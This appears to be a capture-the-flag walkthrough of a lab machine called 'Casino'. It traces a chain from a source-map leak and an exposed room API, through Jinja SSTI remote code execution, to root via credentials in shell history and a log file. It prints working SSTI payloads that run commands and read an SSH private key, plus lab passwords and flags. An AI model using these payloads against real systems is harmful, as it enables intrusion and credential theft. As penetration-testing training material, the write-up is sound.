+++
title = "Casino - Walkthrough"
date = "2026-08-15"
author = "nvru"
description = "Walkthrough for the Casino machine."
tags = [
    "ctf",
    "medium",
    "walkthrough",
    "linux",
    "http",
    "ssti",
    "twig",
    "docker",
    "ssh",
    "adm",
    "log-poisoning",
    "privilege-escalation"
]
draft = false
+++

## Overview

- **Platform:** HackSmarter
- **Difficulty:** `Medium`
- **OS:** `Linux`
- **Attacker IP:** `10.200.81.246`
- **Target IP:** `10.0.31.196`

The objective was to enumerate the target, identify the exposed attack surface, obtain initial access, and escalate privileges to root.

---

## Enumeration

### Port Scanning

#### RustScan

```bash
rustscan -a 10.0.31.196 -- -sC -sV -A -oA nmap/rust
```

#### Results

```text
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.6p1 Ubuntu
80/tcp   open  http    Werkzeug/3.1.8 Python/3.10.18
2222/tcp open  ssh     OpenSSH 8.4p1 Debian
```

The scan revealed three exposed services:

| Port | Service | Version                         |
| ---- | ------- | ------------------------------- |
| 22   | SSH     | OpenSSH 9.6p1                   |
| 80   | HTTP    | Werkzeug 3.1.8 (Python 3.10.18) |
| 2222 | SSH     | OpenSSH 8.4p1                   |

The HTTP service appeared to be the primary attack surface, so I began enumerating the web application.

---

### Web Enumeration

#### Resort Portal

Browsing to port **80** presented a resort guest portal asking for room details to connect to the hotel network.

```text
Please enter your room details to connect to the resort fiber network and access guest services.
```

![Homepage](/images/hsm/casino/http.png)

Inspecting the page source revealed a minimized JavaScript file.

![app.min.js](/images/hsm/casino/app_min_js.png)

A common trick is to check for source maps. Appending `.map` to the filename exposed the original source.

![Source Map](/images/hsm/casino/app_min_js_map.png)

Inside the source map I found the original file:

```text
src/api/roomVerification.js
```

![roomVerification.js](/images/hsm/casino/roomverf_js.png)

The JavaScript disclosed an API endpoint responsible for verifying room information.

![API Path](/images/hsm/casino/found_api_path.png)

Requesting the endpoint returned information about every occupied room.

![API Response](/images/hsm/casino/curl_api.png)

One of the returned entries was:

```text
{
  "checkout": "2026-08-19",
  "guest_name": "Lewis",
  "id": 29,
  "room_number": 232,
  "status": "occupied",
  "tier": "VIP Premium"
}
```

Using one of the exposed room records successfully authenticated me to the application.

![Logged in as Lewis](/images/hsm/casino/log_as_lewis.png)

---

#### Profile Page

After authentication only two features were available:

- Profile
- Logout

The profile page allowed modification of the **Preferred Display Name / Nickname**.

![Profile Page](/images/hsm/casino/profile_page.png)

Since the value was reflected back to the application, I tested for Server-Side Template Injection.

My first payload was the classic arithmetic test:

```jinja
{{7*7}}
```

The expression evaluated successfully.

![SSTI Test](/images/hsm/casino/fam_paylod.png)

---

#### Identifying the Template Engine

![Template Engine](/images/hsm/casino/checking_engine.png)

To identify the template engine I used the following payload:

```jinja
{{7*'7'}}
```

The response confirmed the application was using **Twig/Jinja-style** template rendering.

![Detect Twig](/images/hsm/casino/twig.png)

This meant arbitrary Python object traversal was possible.

---

## Initial Access

### SSTI Remote Code Execution

Using the SSTI vulnerability, I executed operating system commands directly from the template.

```jinja
{{ request.application.__globals__.__builtins__.__import__('os').popen('id').read() }}
```

The command executed successfully.

![Command Execution](/images/hsm/casino/id.png)

I then checked which utilities were available.

Finding **curl**:

```jinja
{{ request.application.__globals__.__builtins__.__import__('os').popen('which curl').read() }}
```

![curl](/images/hsm/casino/found_curl.png)

Finding **bash**:

![bash](/images/hsm/casino/found_bash.png)

Enumerating local users:

![Users](/images/hsm/casino/usrs.png)

The filesystem layout strongly suggested the application was running inside a Docker container.

![Docker](/images/hsm/casino/docker_env.png)

The user **george** possessed an SSH private key while **david** did not, so I read George's key through the SSTI vulnerability.

```jinja
{{ request.application.__globals__.__builtins__.__import__('os').popen('cat /home/george/.ssh/id_rsa').read() }}
```

![George SSH Key](/images/hsm/casino/ssh_key_george.png)

The recovered key did not authenticate on port **22**, but it successfully logged into the SSH service listening on **2222**.

```bash
ssh -i id_rsa george@10.0.31.196 -p 2222
```

![SSH George](/images/hsm/casino/ssh_george.png)

Initial access was successfully obtained as **george**.

---

After obtaining a shell I performed local enumeration.

### Current User

```text
george
```

### Sudo Permissions

```bash
sudo -l
```

George had no useful sudo permissions.

![George Sudo](/images/hsm/casino/sudo_george.png)

The user's shell history was readable.

Inspecting `.bash_history` revealed credentials belonging to **david**.

![George History](/images/hsm/casino/george_hist.png)

Switching users:

```bash
su david
```

![su david](/images/hsm/casino/su_david.png)

I also noticed references to MySQL commands inside the history, but the MySQL client was not installed on the container.

![No MySQL](/images/hsm/casino/no_mysql.png)

Checking sudo again showed no privileges.

![David Sudo](/images/hsm/casino/sudo_david.png)

---

## Privilege Escalation

### Reading Log Files

Although **david** had no sudo rights, he belonged to the **adm** group.

```bash
id
```

Membership in this group allows reading various system log files.

![adm Group](/images/hsm/casino/adm_group.png)

While reviewing the logs, I found the root password stored inside `provisioning.log`.

![Root Password](/images/hsm/casino/found_root_password.png)

Using the recovered password:

```bash
su root
```

![Root Shell](/images/hsm/casino/su_root.png)

---

## Root

After switching to the root account I verified my privileges.

```bash
id
whoami
```

```text
uid=0(root) gid=0(root) groups=0(root)
```

Navigating to `/root` revealed the final flag.

![Root Flag](/images/hsm/casino/root_flag.png)

The machine was successfully compromised.

---

## Credentials

```text
george : SSH Private Key
david  : DavidPass2026!#
root   : R3s0rt_Sup3r_S3cr3t_R00t_2026!
```

---

## Flags

### User

```text
HSM{g30rg3_n33ds_b3tt3r_ssh_k3y_p3rms}
```

### Root

```text
HSM{r3s0rt_w1f1_c0mpete_syst3m_pwn3d!}
```

---

## Attack Path

```text
Port Scan
    ↓
JavaScript Enumeration
    ↓
Source Map Disclosure (.map Exposure)
    ↓
Information Disclosure (Hidden Room Verification API)
    ↓
Broken Authentication / Insecure Guest Verification
    ↓
Server-Side Template Injection (SSTI)
    ↓
Remote Code Execution (RCE)
    ↓
Sensitive Data Exposure (George's SSH Private Key)
    ↓
SSH Access (Port 2222)
    ↓
Credential Exposure (.bash_history)
    ↓
Lateral Movement (george → david)
    ↓
Insecure Group Membership (adm)
    ↓
Sensitive Data Exposure (Root Password in provisioning.log)
    ↓
Privilege Escalation (su root)
    ↓
Root
```

---

## References

- [PayloadsAllTheThings – Server-Side Template Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection)
- [PortSwigger – Server-Side Template Injection](https://portswigger.net/web-security/server-side-template-injection)
- [HackTricks – Server-Side Template Injection](https://book.hacktricks.wiki/en/pentesting-web/ssti-server-side-template-injection/index.html)
